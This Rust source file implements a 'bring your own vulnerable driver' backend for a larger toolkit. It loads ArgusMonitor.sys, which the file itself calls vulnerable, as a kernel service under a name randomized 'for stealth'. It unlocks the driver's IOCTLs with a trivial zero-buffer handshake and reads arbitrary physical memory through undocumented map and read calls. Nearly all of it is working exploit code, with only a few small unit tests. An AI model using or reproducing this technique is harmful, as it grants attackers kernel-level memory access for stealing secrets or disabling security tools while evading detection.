//! ArgusMonitor.sys BYOVD backend for physical memory access.
//!
//! Uses MmMapIoSpace-based slot mapping with XOR-keypad handshake (trivial — zero buffer).
//! Device path: \\.\ArgusMonitorCTLD
//! NO access control on IRP_MJ_CREATE — any admin-level process can open.
//!
//! Protocol quirks vs other drivers:
//!   - Every IOCTL buffer carries a 2-byte big-endian checksum trailer
//!   - Must call IOCTL_HANDSHAKE (zero keypad) before other IOCTLs work
//!   - Physical memory accessed via map-slot model (map → read DWORD → unmap)
//!   - Also has single-shot read (map+read+unmap in one IOCTL)

use std::process::Command;
use std::{ptr, thread, time::Duration};

use super::{
    generate_service_name, log, run_sc, to_wide, PhysMemReader,
    GENERIC_READ, GENERIC_WRITE, INVALID_HANDLE, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE,
    CreateFileW, DeviceIoControl, CloseHandle, GetLastError,
};

// ─── IOCTL Codes ────────────────────────────────────────────────────────────

const IOCTL_HANDSHAKE: u32 = 0x9C40_2B74;
const IOCTL_PHYSMEM_MAP: u32 = 0x9C40_3A54;
const IOCTL_PHYSMEM_UNMAP: u32 = 0x9C40_2934;
const IOCTL_PHYSMEM_RD_DW: u32 = 0x9C40_20D8;
const IOCTL_PHYSMEM_SINGLE: u32 = 0x9C40_2994;

// ─── Default driver path ────────────────────────────────────────────────────

const ARGUS_DEFAULT_PATH: &str =
    r"D:\Project\toolkit\drivers\Vulnerable-Monitors\ArgusMonitor.sys";
const ARGUS_ALT_PATH: &str = r"drivers\ArgusMonitor.sys";

// ─── Checksum helpers ───────────────────────────────────────────────────────

/// Compute the ArgusMonitor checksum: sum of all payload bytes (before the
/// 2-byte trailer) stored as big-endian u16 at the end of the buffer.
fn build_buf(payload: &[u8], total_len: usize) -> Vec<u8> {
    assert!(total_len >= 2, "total_len must be at least 2 for checksum");
    let data_len = total_len - 2;
    let mut buf = vec![0u8; total_len];
    let copy_len = payload.len().min(data_len);
    buf[..copy_len].copy_from_slice(&payload[..copy_len]);
    // Compute checksum over data portion
    let sum: u16 = buf[..data_len].iter().map(|&b| b as u16).sum::<u16>();
    buf[data_len] = (sum >> 8) as u8;
    buf[data_len + 1] = (sum & 0xFF) as u8;
    buf
}

/// Strip the 2-byte checksum trailer from an output buffer.
fn strip_checksum(data: &[u8]) -> &[u8] {
    if data.len() >= 2 { &data[..data.len() - 2] } else { data }
}

// ─── Backend ────────────────────────────────────────────────────────────────

pub struct ArgusMonitorBackend {
    handle: isize,
    available: bool,
    pub last_error: Option<String>,
    service_name: Option<String>,
}

impl ArgusMonitorBackend {
    pub fn new() -> Self {
        Self::with_path(ARGUS_DEFAULT_PATH)
    }

    pub fn with_path(sys_path: &str) -> Self {
        // Locate driver binary
        let path = if std::path::Path::new(sys_path).exists() {
            sys_path.to_string()
        } else if std::path::Path::new(ARGUS_ALT_PATH).exists() {
            ARGUS_ALT_PATH.to_string()
        } else {
            return Self::fail(format!("Driver binary not found at {}", sys_path));
        };

        // Try opening device first (maybe already loaded from a previous run)
        if let Some(backend) = Self::try_open_existing() {
            return backend;
        }

        // Load driver via sc create/start
        log("[argus] Loading ArgusMonitor.sys via sc create/start...");

        let abs_path = match std::fs::canonicalize(&path) {
            Ok(p) => p.to_string_lossy().to_string(),
            Err(e) => return Self::fail(format!("Cannot resolve path: {}", e)),
        };

        // Clean stale service
        run_sc(&["stop", "ArgusMonitorCTL"]);
        run_sc(&["delete", "ArgusMonitorCTL"]);
        thread::sleep(Duration::from_millis(300));

        // Randomized service name for stealth
        let svc_name = generate_service_name();
        log(&format!("[argus] Using service name: {}", svc_name));

        let created = run_sc(&[
            "create", &svc_name, "type=", "kernel", "binpath=", &abs_path,
        ]);
        if !created {
            return Self::fail("sc create failed (need admin?)".into());
        }

        let started = run_sc(&["start", &svc_name]);
        if !started {
            run_sc(&["delete", &svc_name]);
            return Self::fail("sc start failed (driver blocked by HVCI/DSE?)".into());
        }

        thread::sleep(Duration::from_millis(500));

        // Open device
        let h = Self::open_device();
        if h == INVALID_HANDLE {
            let err = unsafe { GetLastError() };
            run_sc(&["stop", &svc_name]);
            run_sc(&["delete", &svc_name]);
            return Self::fail(format!("Device open failed after load, error {}", err));
        }

        // Perform handshake
        if !Self::do_handshake(h) {
            unsafe { CloseHandle(h); }
            run_sc(&["stop", &svc_name]);
            run_sc(&["delete", &svc_name]);
            return Self::fail("Handshake failed — IOCTLs remain locked".into());
        }

        log("[argus] Driver loaded, handshake OK — all IOCTLs unlocked");
        ArgusMonitorBackend {
            handle: h,
            available: true,
            last_error: None,
            service_name: Some(svc_name),
        }
    }

    /// Try to open an already-loaded device and handshake.
    fn try_open_existing() -> Option<Self> {
        let h = Self::open_device();
        if h == INVALID_HANDLE {
            return None;
        }
        log("[argus] Device already present, attempting handshake...");
        if !Self::do_handshake(h) {
            unsafe { CloseHandle(h); }
            log("[argus] Existing device handshake failed");
            return None;
        }
        log("[argus] Existing device ready");
        Some(ArgusMonitorBackend {
            handle: h,
            available: true,
            last_error: None,
            service_name: None,
        })
    }

    fn open_device() -> isize {
        let wide = to_wide(r"\\.\ArgusMonitorCTLD");
        unsafe {
            CreateFileW(
                wide.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null(),
            )
        }
    }

    /// Send the zero-keypad handshake that unlocks all subsequent IOCTLs.
    /// Input: 0x200 bytes of zeros (with checksum). Output: 0x210 bytes.
    fn do_handshake(handle: isize) -> bool {
        let buf = build_buf(&[], 0x200);
        let mut out = vec![0u8; 0x210];
        let mut returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                handle,
                IOCTL_HANDSHAKE,
                buf.as_ptr(),
                0x200,
                out.as_mut_ptr(),
                0x210,
                &mut returned,
                ptr::null(),
            )
        };
        ok != 0
    }

    fn fail(reason: String) -> Self {
        log(&format!("[argus] {}", reason));
        ArgusMonitorBackend {
            handle: INVALID_HANDLE,
            available: false,
            last_error: Some(reason),
            service_name: None,
        }
    }

    // ─── Low-level IOCTL wrappers ───────────────────────────────────────────

    /// Map a physical address range into a kernel slot.
    /// Returns the kernel virtual address on success.
    fn physmem_map(&self, slot: u32, phys_addr: u64, size: u32) -> Result<u64, String> {
        // Input layout (0x28 total with checksum):
        //   +0x00  DWORD   slot
        //   +0x04  QWORD   phys_addr
        //   +0x0C  DWORD   size
        //   +0x10  DWORD   bus_num (0xFF = don't care)
        //   +0x14  DWORD   force_remap (1)
        let mut payload = Vec::with_capacity(0x18);
        payload.extend_from_slice(&slot.to_le_bytes());       // +0x00
        payload.extend_from_slice(&phys_addr.to_le_bytes());  // +0x04
        payload.extend_from_slice(&size.to_le_bytes());       // +0x0C
        payload.extend_from_slice(&0xFFu32.to_le_bytes());    // +0x10 bus_num
        payload.extend_from_slice(&1u32.to_le_bytes());       // +0x14 force_remap

        let buf = build_buf(&payload, 0x28);
        let mut out = vec![0u8; 0x20];
        let mut returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYSMEM_MAP,
                buf.as_ptr(),
                0x28,
                out.as_mut_ptr(),
                0x20,
                &mut returned,
                ptr::null(),
            )
        };

        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(format!("physmem_map failed at 0x{:X}, error {}", phys_addr, err));
        }

        let raw = strip_checksum(&out[..returned as usize]);
        if raw.len() < 8 {
            return Err("physmem_map output too short".into());
        }
        let kva = u64::from_le_bytes(raw[0..8].try_into().unwrap());
        if kva == 0 {
            return Err(format!("physmem_map returned null for 0x{:X}", phys_addr));
        }
        Ok(kva)
    }

    /// Unmap a previously mapped slot.
    fn physmem_unmap(&self, slot: u32) {
        let payload = slot.to_le_bytes().to_vec();
        let buf = build_buf(&payload, 0x18);
        let mut returned: u32 = 0;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYSMEM_UNMAP,
                buf.as_ptr(),
                0x18,
                ptr::null_mut(),
                0,
                &mut returned,
                ptr::null(),
            );
        }
    }

    /// Read a DWORD from a mapped slot at the given offset.
    fn physmem_read_dword(&self, slot: u32, offset: u32) -> Result<u32, String> {
        // Input layout (0x18 total with checksum):
        //   +0x00  DWORD  slot
        //   +0x04  DWORD  offset
        let mut payload = Vec::with_capacity(8);
        payload.extend_from_slice(&slot.to_le_bytes());
        payload.extend_from_slice(&offset.to_le_bytes());

        let buf = build_buf(&payload, 0x18);
        let mut out = vec![0u8; 0x18];
        let mut returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYSMEM_RD_DW,
                buf.as_ptr(),
                0x18,
                out.as_mut_ptr(),
                0x18,
                &mut returned,
                ptr::null(),
            )
        };

        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(format!("physmem_read_dword slot={} off=0x{:X} error {}", slot, offset, err));
        }

        let raw = strip_checksum(&out[..returned as usize]);
        if raw.len() < 4 {
            return Err("physmem_read_dword output too short".into());
        }
        Ok(u32::from_le_bytes(raw[0..4].try_into().unwrap()))
    }

    /// Single-shot physical read: maps, reads one DWORD, unmaps — all in one IOCTL.
    fn physmem_single_read(&self, phys_addr: u64) -> Result<u32, String> {
        // Input layout (0x20 total with checksum):
        //   +0x00  QWORD  phys_addr
        //   +0x08  DWORD  bus_num (0xFF)
        //   +0x0C  DWORD  cache_type (0 = uncached)
        let mut payload = Vec::with_capacity(0x10);
        payload.extend_from_slice(&phys_addr.to_le_bytes());
        payload.extend_from_slice(&0xFFu32.to_le_bytes());
        payload.extend_from_slice(&0u32.to_le_bytes());

        let buf = build_buf(&payload, 0x20);
        let mut out = vec![0u8; 0x18];
        let mut returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYSMEM_SINGLE,
                buf.as_ptr(),
                0x20,
                out.as_mut_ptr(),
                0x18,
                &mut returned,
                ptr::null(),
            )
        };

        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(format!("physmem_single at 0x{:X} error {}", phys_addr, err));
        }

        let raw = strip_checksum(&out[..returned as usize]);
        if raw.len() < 4 {
            return Err("physmem_single output too short".into());
        }
        Ok(u32::from_le_bytes(raw[0..4].try_into().unwrap()))
    }
}

// ─── PhysMemReader trait implementation ─────────────────────────────────────

impl PhysMemReader for ArgusMonitorBackend {
    fn name(&self) -> &str {
        "ArgusMonitor"
    }

    fn is_available(&self) -> bool {
        self.available
    }

    fn read_phys(&self, addr: u64, size: u32) -> Result<Vec<u8>, String> {
        if !self.available {
            return Err("ArgusMonitor not available".into());
        }

        // Strategy: for small reads (<=4 bytes), use single-shot IOCTL.
        // For larger reads, map a slot, read DWORDs, then unmap.
        if size <= 4 {
            let dw = self.physmem_single_read(addr)?;
            let bytes = dw.to_le_bytes();
            return Ok(bytes[..size as usize].to_vec());
        }

        // Use slot 7 (arbitrary, avoids conflict with other potential users of low slots)
        const SLOT: u32 = 7;

        // Align size up to 4-byte boundary for DWORD reads
        let aligned_size = (size + 3) & !3;

        // Map the physical region
        let _kva = self.physmem_map(SLOT, addr, aligned_size)?;

        // Read DWORDs from the mapped slot
        let mut result = Vec::with_capacity(size as usize);
        let dword_count = aligned_size / 4;

        for i in 0..dword_count {
            let offset = i * 4;
            match self.physmem_read_dword(SLOT, offset) {
                Ok(dw) => {
                    let bytes = dw.to_le_bytes();
                    let remaining = (size as usize).saturating_sub(result.len());
                    let take = remaining.min(4);
                    result.extend_from_slice(&bytes[..take]);
                }
                Err(e) => {
                    // Unmap before returning error
                    self.physmem_unmap(SLOT);
                    return Err(format!(
                        "Read failed at offset 0x{:X} within mapping: {}",
                        offset, e
                    ));
                }
            }
        }

        // Unmap the slot
        self.physmem_unmap(SLOT);

        // Truncate to exact requested size
        result.truncate(size as usize);
        Ok(result)
    }
}

// ─── Drop: cleanup service on destruction ───────────────────────────────────

impl Drop for ArgusMonitorBackend {
    fn drop(&mut self) {
        if self.handle != INVALID_HANDLE {
            unsafe { CloseHandle(self.handle); }
        }
        if let Some(ref name) = self.service_name {
            log(&format!("[argus] Cleaning up service: {}", name));
            run_sc(&["stop", name]);
            run_sc(&["delete", name]);
        }
    }
}

// ─── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_buf_checksum() {
        // Zero payload, total_len=4 → 2 data bytes (0x00,0x00) + checksum (0x00,0x00)
        let buf = build_buf(&[], 4);
        assert_eq!(buf.len(), 4);
        assert_eq!(buf, vec![0, 0, 0, 0]);

        // Known payload: [0x01, 0x02] with total_len=4
        // sum = 0x01 + 0x02 = 0x0003 → big-endian → [0x00, 0x03]
        let buf = build_buf(&[0x01, 0x02], 4);
        assert_eq!(buf, vec![0x01, 0x02, 0x00, 0x03]);
    }

    #[test]
    fn test_strip_checksum() {
        let data = [1, 2, 3, 4, 5, 6];
        let stripped = strip_checksum(&data);
        assert_eq!(stripped, &[1, 2, 3, 4]);
    }

    #[test]
    fn test_fail_creates_unavailable_backend() {
        let backend = ArgusMonitorBackend::fail("test error".into());
        assert!(!backend.available);
        assert_eq!(backend.last_error.as_deref(), Some("test error"));
        assert_eq!(backend.handle, INVALID_HANDLE);
    }
}
